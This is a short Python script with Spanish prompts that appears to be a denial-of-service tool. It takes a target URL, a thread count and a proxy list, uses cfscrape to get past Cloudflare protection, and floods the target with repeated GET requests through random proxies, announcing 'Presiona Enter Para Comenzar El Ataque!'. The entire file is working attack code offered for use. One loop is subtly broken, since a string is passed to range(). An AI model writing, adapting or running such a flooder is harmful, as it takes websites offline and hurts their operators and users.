import cfscrape
import os
import random
import time
import threading
import colorama
from colorama import Fore

os.system("cls || clear")


def creador():
    for a in range(thr):
        x = threading.Thread(target=atk)
        x.start()
        print(str(a+1) + " Threads Creados")
    print(Fore.CYAN + "Lista De Proxies Seleccionada: " + Fore.WHITE + lista)
    print(Fore.RED + "Cargando Threads...")
    time.sleep(3)
    input(Fore.YELLOW + "Presiona Enter Para Comenzar El Ataque!")
    global oo
    oo = True

oo = False
def menu():
    global thr
    global lista
    global eipi
    eipi = input(Fore.CYAN + "Target URL: " + Fore.WHITE)
    thr = int(input(Fore.YELLOW + "Threads: " + Fore.WHITE))
    lista = str(input(Fore.GREEN + "Lista De Proxies: [default = proxies.txt] " + Fore.WHITE))
    if lista == '':
        lista = 'proxies.txt'
        pass
    creador()
def atk():
    per = '70'
    pprr = open(lista).readlines()
    proxy = random.choice(pprr).strip().split(":")
    s = cfscrape.create_scraper()
    s.proxies = {}
    s.proxies['http'] = 'http://'+str(proxy[0])+":"+str(proxy[1])
    s.proxies['https'] = 'https://'+str(proxy[0])+":"+str(proxy[1])
    time.sleep(3)
    while True:
        while oo:
            try:
                s.get(eipi)
                print(Fore.GREEN + "Conexion Exitosa")
                try:
                    for g in range(per):
                        s.get(eipi)
                        print(Fore.GREEN + "Conexion Exitosa")
                    s.close()
                except:
                    s.close()
            except:
                s.close()
                print(Fore.RED + "Conexion Rechazada")

menu()
